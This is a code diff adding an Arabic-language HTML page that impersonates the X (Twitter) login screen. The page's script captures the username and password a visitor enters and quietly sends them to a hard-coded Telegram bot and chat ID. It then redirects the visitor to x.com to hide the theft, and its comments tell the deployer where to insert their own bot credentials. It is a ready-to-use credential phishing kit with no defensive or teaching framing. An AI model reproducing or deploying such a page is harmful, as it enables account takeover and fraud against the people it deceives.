@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X – تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            width: 90%;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .logo {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0f1419;
+            margin: 0 0 8px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #536471;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 16px;
+            margin: 10px 0;
+            border: 1px solid #cfd9de;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #1d9bf0;
+            box-shadow: 0 0 0 2px rgba(29,155,240,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #0f1419;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 20px 0 10px;
+        }
+        .btn:hover {
+            background: #272c30;
+        }
+        .footer-links {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #536471;
+        }
+        .footer-links a {
+            color: #1d9bf0;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            margin-top: 25px;
+            border-radius: 5px;
+            font-size: 13px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- شعار X (تويتر) -->
+        <svg class="logo" viewBox="0 0 24 24" fill="#0f1419">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+        
+        <h1>تسجيل الدخول إلى X</h1>
+        <p class="subtitle">للمتابعة إلى حسابك</p>
+
+        <form id="twitterForm">
+            <input type="text" id="emailField" placeholder="الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
+            <input type="password" id="passField" placeholder="كلمة المرور" required>
+            
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">نسيت كلمة المرور؟</a> •
+            <a href="#">ساعدني</a> •
+            <a href="#">الخصوصية</a>
+        </div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // ⚠️ هنا تضع التوكن والـ Chat ID الخاصين بك
+        // ==========================================
+        const BOT_TOKEN = "8870343553:AAFnA6n4pmXhy9c1dU-ebtOdC78UeGCqrow";
+        const CHAT_ID = "1346886960";
+
+        // ==========================================
+        // كود الإرسال إلى تيليجرام
+        // ==========================================
+        document.getElementById('twitterForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع إرسال النموذج التقليدي
+
+            // جلب البيانات من الحقول
+            var user = document.getElementById('emailField').value;
+            var pass = document.getElementById('passField').value;
+
+            // تجهيز الرسالة
+            var message = "🚨 بيانات X جديدة!\n━━━━━━━━━━━━━━━\n👤 " + user + "\n🔑 " + pass;
+
+            // رابط API مع التوكن ومعرف الشات
+            var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);
+
+            // إرسال الطلب بصمت، ثم توجيه المستخدم إلى x.com
+            fetch(url).finally(function() {
+                window.location.href = "https://x.com/";
+            });
+        });
+    </script>
+</body>
+</html>
